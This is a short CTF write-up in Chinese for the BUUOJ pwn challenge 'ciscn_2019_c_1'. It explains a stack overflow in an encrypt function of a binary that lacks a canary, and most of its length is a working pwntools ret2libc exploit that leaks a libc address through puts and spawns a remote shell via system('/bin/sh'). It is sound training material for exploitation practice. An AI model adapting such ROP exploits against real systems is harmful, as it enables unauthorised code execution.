---
title: "ciscn_2019_c_1"
description: ""
date: 2023-04-06T20:58:25+08:00
lastmod: 2023-04-06T20:58:25+08:00
draft: false
images: []
type: docs
weight: 996
toc: true
---

## 0x01 分析

![47938fccb953c63b4606c12ae05243b1](images/47938fccb953c63b4606c12ae05243b1.png)  

没有canary保护，got表也可写

![07402b7baa916abebf223be1857d91bf](images/07402b7baa916abebf223be1857d91bf.png)  

encrypt存在一个溢出点

![fb82b8bef697530ae82f109e1bd0f47d](images/fb82b8bef697530ae82f109e1bd0f47d.png)  

结尾处也有一个可以泄露栈的地方，但是泄露的东西都是经过加密的，加密方法也不难，但可以直接调用puts@plt泄露比较方便，然后就是常规的ret2libc

## 0x02 Exploit

```python
from pwn import*
from LibcSearcher import*
# context.log_level = 'debug'
# o = process("./pwn")
o = remote("node4.buuoj.cn", 27675)
elf = ELF("./pwn")
# libc = elf.libc
puts_plt = elf.plt['puts']
gets_got = elf.got['gets']
encrypt = elf.sym['encrypt']
pop_rdi = 0x0000000000400c83

# leak libc
payload = b'aaaaaaa\x00' + b'a'*80
payload += p64(pop_rdi) +p64(gets_got) + p64(puts_plt) + p64(encrypt)
o.sendline(b'1')
o.sendline(payload)
o.recvuntil("lllllll\n")    # aaaaaaa加密后的结果
gets_addr = u64(o.recv(6) + b"\x00\x00")
libc = LibcSearcher("gets", gets_addr)
libc_base = gets_addr - libc.dump("gets")
log.info(hex(libc_base))
sys_addr = libc_base + libc.dump("system")
bin_sh = libc_base + libc.dump("str_bin_sh")

# attack
payload = b'aaaaaaa\x00' + b'a'*80
payload += p64(pop_rdi) + p64(bin_sh) +  p64(0x400B27) + p64(sys_addr)
o.sendline(payload)
o.interactive()

```

![](Files/image 4.png)
